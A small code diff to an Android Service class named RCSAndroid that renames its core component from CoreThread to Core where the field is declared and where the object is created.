@@ -24,7 +24,7 @@ import android.widget.Toast;
 public class RCSAndroid extends Service {
 
 	/** The core. */
-	private CoreThread core;
+	private Core core;
 
 	/** The battery receiver. */
 	BroadcastReceiver batteryReceiver;
@@ -126,7 +126,7 @@ public class RCSAndroid extends Service {
 		Toast.makeText(this, "Que - Service Started, starting thread",
 				Toast.LENGTH_LONG).show();
 
-		core = new CoreThread();
+		core = new Core();
 
 		// Core starts
 		core.Start(this.getResources(), getContentResolver());
